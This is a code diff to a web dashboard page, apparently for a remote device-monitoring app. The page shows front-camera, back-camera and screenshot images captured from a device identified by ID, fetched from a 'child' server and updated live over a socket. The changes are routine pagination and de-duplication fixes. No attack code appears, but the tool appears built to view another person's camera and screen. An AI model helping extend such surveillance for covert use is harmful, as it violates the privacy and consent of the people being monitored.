@@ -52,10 +52,10 @@
         .tab-btn[data-target="camera"].active { border-bottom-color: var(--accent-cam); color: var(--accent-cam); }
         .tab-btn[data-target="screen"].active { border-bottom-color: var(--accent-screen); color: var(--accent-screen); }
 
-        /* --- GRID LAYOUT (FIXED FOR FULL IMAGE VIEW) --- */
+        /* --- GRID LAYOUT --- */
         .gallery-container {
             display: grid;
-            grid-template-columns: repeat(2, 1fr); /* 2 Photos per row for better view */
+            grid-template-columns: repeat(2, 1fr); /* 2 Photos per row */
             gap: 15px;
             padding-bottom: 20px;
         }
@@ -68,18 +68,16 @@
             border: 1px solid var(--glass-border);
             cursor: pointer;
             box-shadow: 0 4px 10px rgba(0,0,0,0.5);
-            /* Fixed height for uniformity */
             height: 250px; 
             display: flex;
             align-items: center;
             justify-content: center;
         }
         
-        /* 🔥 FIX: Image Pura dikhane ke liye object-fit contain kiya */
         .img-card img {
             width: 100%; 
             height: 100%; 
-            object-fit: contain; /* Pura photo dikhega, katega nahi */
+            object-fit: contain; 
             background-color: #000;
             transition: transform 0.3s;
         }
@@ -179,15 +177,15 @@
     </div>
 
     <script>
-        // 🔥 SERVER URL (Tumhara Server)
+        // 🔥 SERVER URL
         const API_BASE = 'https://child-v9no.onrender.com'; 
         
         const urlParams = new URLSearchParams(window.location.search);
         const DEVICE_ID = urlParams.get('id') || localStorage.getItem('monitoring_id');
 
-        let allFilesData = []; // Saare photos yahan store honge
-        let currentFilter = 'camera'; // Default tab
-        let nextCursor = null; // Pagination cursor
+        let allFilesData = []; 
+        let currentFilter = 'camera'; 
+        let nextCursor = null; 
         let isLoading = false;
 
         // UI Elements
@@ -200,7 +198,7 @@
         const downloadLink = document.getElementById('downloadLink');
         const tabs = document.querySelectorAll('.tab-btn');
 
-        // 🔥 1. SOCKET CONNECTION (Realtime Naye Photo ke liye)
+        // 🔥 1. SOCKET CONNECTION
         const socket = io(API_BASE, { transports: ['websocket', 'polling'] });
 
         window.onload = function() {
@@ -208,22 +206,24 @@
                 alert("Device ID Missing!");
                 return;
             }
-            fetchFiles(true); // Pehli baar load karo
-            setupSocket();    // Live connection jodo
+            fetchFiles(true); // First load
+            setupSocket();    // Live connection
         };
 
         // ==========================================
-        //  2. FETCH DATA (Server se photos lao)
+        //  2. FETCH DATA (UPDATED LOGIC)
         // ==========================================
         function fetchFiles(isReset = false) {
             if (isLoading) return;
             isLoading = true;
             loadingSpinner.style.display = 'block';
 
-            // URL mein pagination (cursor) logic
-            let url = `${API_BASE}/api/gallery-list/${DEVICE_ID}`;
+            // 🔥 CHANGE 1: 'limit=20' add kiya taaki ek baar mein 20 photos aaye
+            let url = `${API_BASE}/api/gallery-list/${DEVICE_ID}?limit=20`;
+
+            // Agar cursor hai (load more ke liye), to use URL mein jodo
             if (nextCursor && !isReset) {
-                url += `?next_cursor=${nextCursor}`;
+                url += `&next_cursor=${nextCursor}`;
             }
 
             fetch(url)
@@ -234,7 +234,6 @@
 
                     let newFiles = data.photos || [];
                     
-                    // Agar server cursor bhej raha hai to save karo
                     if (data.next_cursor) {
                         nextCursor = data.next_cursor;
                         loadMoreArea.style.display = 'block';
@@ -245,9 +244,10 @@
 
                     // Data Store Logic
                     if (isReset) {
-                        allFilesData = newFiles; // Purana hata ke naya rakho
+                        allFilesData = newFiles; // Reset array
                     } else {
-                        allFilesData = [...allFilesData, ...newFiles]; // Purane mein naya jodo
+                        // Load more ke time pe purane photos niche add honge
+                        allFilesData = [...allFilesData, ...newFiles]; 
                     }
 
                     renderGallery();
@@ -259,13 +259,12 @@
                 });
         }
 
-        // Load More button click par ye chalega
         function fetchNextPage() {
             if (nextCursor) fetchFiles(false);
         }
 
         // ==========================================
-        //  3. FILTER & RENDER (Photo dikhana)
+        //  3. FILTER & RENDER
         // ==========================================
         function switchTab(category) {
             currentFilter = category;
@@ -279,7 +278,7 @@
         }
 
         function renderGallery() {
-            // Filter Logic: Camera ya Screen ke hisaab se chato
+            // Filter Logic
             const filtered = allFilesData.filter(url => {
                 const lowerUrl = url.toLowerCase();
                 if (currentFilter === 'camera') {
@@ -298,6 +297,7 @@
                 emptyState.style.display = 'none';
             }
 
+            // Render Photos
             filtered.forEach(url => {
                 const div = document.createElement('div');
                 div.className = 'img-card';
@@ -308,7 +308,6 @@
                 if(url.includes('back')) badgeText = "Back Cam";
                 if(url.includes('screen')) badgeText = "Screen";
 
-                // Image tag creation
                 div.innerHTML = `
                     <img src="${url}" loading="lazy" onerror="this.style.display='none'">
                     <div class="source-badge">${badgeText}</div>
@@ -318,21 +317,23 @@
         }
 
         // ==========================================
-        //  4. REAL-TIME UPDATES (Socket Logic)
+        //  4. REAL-TIME UPDATES (NEWEST ON TOP)
         // ==========================================
         function setupSocket() {
-            // Jab naya photo aaye
             socket.on('new-file', (data) => {
                 console.log("New file received:", data);
                 if (data.device_id === DEVICE_ID) {
-                    // Array ke top par add karo
-                    allFilesData.unshift(data.url);
                     
-                    // Check karo ki current tab mein dikhana hai ya nahi
+                    // 🔥 CHANGE 2: Naye photo ko 'unshift' se TOP pe daala
+                    // Aur duplicate check kiya taaki same photo 2 baar na dikhe
+                    if (!allFilesData.includes(data.url)) {
+                        allFilesData.unshift(data.url);
+                    }
+                    
+                    // Refresh View only if in correct tab
                     let isCam = data.url.includes('cam') || data.url.includes('front') || data.url.includes('back');
                     let isScreen = data.url.includes('screen') || data.url.includes('shot');
 
-                    // Agar user ussi tab par hai jiska photo aaya hai, to refresh karo
                     if ((currentFilter === 'camera' && isCam) || (currentFilter === 'screen' && isScreen)) {
                         renderGallery(); 
                     }
@@ -341,7 +342,7 @@
         }
 
         // ==========================================
-        //  MODAL LOGIC (Zoom View)
+        //  MODAL LOGIC
         // ==========================================
         function openModal(url) {
             fullImage.src = url;
